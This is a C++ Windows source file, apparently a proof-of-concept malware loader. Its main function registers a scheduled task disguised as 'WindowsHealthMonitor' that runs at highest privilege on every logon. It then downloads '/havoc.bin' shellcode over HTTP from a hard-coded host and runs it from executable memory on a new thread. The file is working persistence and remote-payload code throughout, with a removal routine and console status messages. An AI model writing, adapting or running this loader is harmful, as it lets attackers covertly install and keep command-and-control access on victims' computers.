#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <taskschd.h>
#include <comdef.h>  // Required for _bstr_t and _variant_t
#include <atlcomcli.h> // Alternative for CComVariant and CComBSTR

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
void ExecuteShellcode(std::vector<BYTE>& shellcode);
BOOL CreateScheduledTask();
void RemoveScheduledTask();

int main()
{
    std::cout << "[+] Starting persistence installer..." << std::endl;

    // Install scheduled task for persistence
    if (CreateScheduledTask()) {
        std::cout << "[+] Scheduled task created successfully!" << std::endl;
    }
    else {
        std::cout << "[-] Failed to create scheduled task" << std::endl;
    }

    // Download and execute immediately (for testing)
    std::cout << "[+] Downloading payload..." << std::endl;
    std::vector<BYTE> shellcode = Download(L"192.168.215.132", L"/havoc.bin");

    if (shellcode.empty()) {
        std::cout << "[-] Failed to download shellcode" << std::endl;

        // Test with a simple message box instead for POC
        std::cout << "[*] Testing with message box instead..." << std::endl;
        MessageBoxA(NULL, "Persistence Test - Scheduled Task Working!", "Test", MB_OK);

    }
    else {
        std::cout << "[+] Shellcode downloaded (" << shellcode.size() << " bytes)" << std::endl;
        std::cout << "[+] Executing shellcode..." << std::endl;
        ExecuteShellcode(shellcode);
    }

    std::cout << "[+] Persistence installed. Process will continue running." << std::endl;
    std::cout << "[*] To test persistence: Reboot system or log off/log on" << std::endl;
    std::cout << "[*] Press Enter to exit this window (task will persist)" << std::endl;
    std::cin.get();

    return 0;
}

BOOL CreateScheduledTask() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        std::cout << "[-] CoInitialize failed: " << hr << std::endl;
        return FALSE;
    }

    ITaskService* pService = NULL;
    ITaskFolder* pRootFolder = NULL;
    IRegisteredTask* pRegisteredTask = NULL;
    ITaskDefinition* pTask = NULL;

    BOOL success = FALSE;

    try {
        // Create Task Scheduler service instance
        hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
            IID_ITaskService, (void**)&pService);
        if (FAILED(hr)) {
            std::cout << "[-] CoCreateInstance failed: " << hr << std::endl;
            throw std::exception();
        }

        // Connect to task service
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (FAILED(hr)) {
            std::cout << "[-] Connect to Task Scheduler failed: " << hr << std::endl;
            throw std::exception();
        }

        // Get root task folder
        hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
        if (FAILED(hr)) {
            std::cout << "[-] GetFolder failed: " << hr << std::endl;
            throw std::exception();
        }

        // Create new task definition
        hr = pService->NewTask(0, &pTask);
        if (FAILED(hr)) {
            std::cout << "[-] NewTask failed: " << hr << std::endl;
            throw std::exception();
        }

        // Set principal (security context)
        IPrincipal* pPrincipal = NULL;
        hr = pTask->get_Principal(&pPrincipal);
        if (SUCCEEDED(hr)) {
            pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
            pPrincipal->Release();
        }

        // Set task settings
        ITaskSettings* pSettings = NULL;
        hr = pTask->get_Settings(&pSettings);
        if (SUCCEEDED(hr)) {
            pSettings->put_StartWhenAvailable(VARIANT_BOOL(true));
            pSettings->put_DisallowStartIfOnBatteries(VARIANT_BOOL(false));
            pSettings->put_StopIfGoingOnBatteries(VARIANT_BOOL(false));
            pSettings->put_ExecutionTimeLimit(_bstr_t(L"PT0S")); // No time limit
            pSettings->put_AllowHardTerminate(VARIANT_BOOL(false));
            pSettings->Release();
        }

        // Create logon trigger
        ITriggerCollection* pTriggerCollection = NULL;
        hr = pTask->get_Triggers(&pTriggerCollection);
        if (SUCCEEDED(hr)) {
            ITrigger* pTrigger = NULL;
            hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
            if (SUCCEEDED(hr)) {
                ILogonTrigger* pLogonTrigger = NULL;
                hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
                if (SUCCEEDED(hr)) {
                    pLogonTrigger->put_Id(_bstr_t(L"LogonTrigger1"));
                    pLogonTrigger->put_Delay(_bstr_t(L"PT30S")); // 30 second delay
                    pLogonTrigger->Release();
                }
                pTrigger->Release();
            }
            pTriggerCollection->Release();
        }

        // Create action (execute our program)
        IActionCollection* pActionCollection = NULL;
        hr = pTask->get_Actions(&pActionCollection);
        if (SUCCEEDED(hr)) {
            IAction* pAction = NULL;
            hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
            if (SUCCEEDED(hr)) {
                IExecAction* pExecAction = NULL;
                hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                if (SUCCEEDED(hr)) {
                    WCHAR modulePath[MAX_PATH];
                    GetModuleFileNameW(NULL, modulePath, MAX_PATH);

                    pExecAction->put_Path(_bstr_t(modulePath));
                    pExecAction->put_Arguments(_bstr_t(L""));

                    std::wcout << L"[*] Setting task to execute: " << modulePath << std::endl;
                    pExecAction->Release();
                }
                pAction->Release();
            }
            pActionCollection->Release();
        }

        // Register the task
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(L"WindowsHealthMonitor"),
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(),
            _variant_t(),
            TASK_LOGON_INTERACTIVE_TOKEN,
            _variant_t(L""),
            &pRegisteredTask);

        if (SUCCEEDED(hr)) {
            std::cout << "[+] Scheduled task registered successfully!" << std::endl;
            success = TRUE;
        }
        else {
            std::cout << "[-] Failed to register task: " << hr << std::endl;
        }

    }
    catch (...) {
        success = FALSE;
    }

    // Cleanup
    if (pRegisteredTask) pRegisteredTask->Release();
    if (pTask) pTask->Release();
    if (pRootFolder) pRootFolder->Release();
    if (pService) pService->Release();

    CoUninitialize();
    return success;
}

void RemoveScheduledTask() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return;

    ITaskService* pService = NULL;
    ITaskFolder* pRootFolder = NULL;

    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pService);
    if (SUCCEEDED(hr)) {
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (SUCCEEDED(hr)) {
            hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
            if (SUCCEEDED(hr)) {
                pRootFolder->DeleteTask(_bstr_t(L"WindowsHealthMonitor"), 0);
                std::cout << "[+] Scheduled task removed!" << std::endl;
                pRootFolder->Release();
            }
        }
        pService->Release();
    }
    CoUninitialize();
}

// Your existing Download function
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
    std::vector<BYTE> buffer;

    HINTERNET hSession = WinHttpOpen(L"UserAgent/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        std::cout << "[-] WinHttpOpen failed" << std::endl;
        return buffer;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, baseAddress, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        std::cout << "[-] WinHttpConnect failed" << std::endl;
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", filename, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        std::cout << "[-] WinHttpOpenRequest failed" << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    BOOL bSent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bSent) {
        std::cout << "[-] WinHttpSendRequest failed" << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    BOOL bResponse = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResponse) {
        std::cout << "[-] WinHttpReceiveResponse failed" << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    DWORD bytesRead = 0;
    BYTE temp[4096];

    do {
        bytesRead = 0;
        if (WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead) && bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }
    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

// Your existing ExecuteShellcode function
void ExecuteShellcode(std::vector<BYTE>& shellcode) {
    LPVOID ptr = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (ptr != NULL) {
        memcpy(ptr, shellcode.data(), shellcode.size());
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, NULL);

        if (hThread != NULL) {
            CloseHandle(hThread);
        }
    }
}
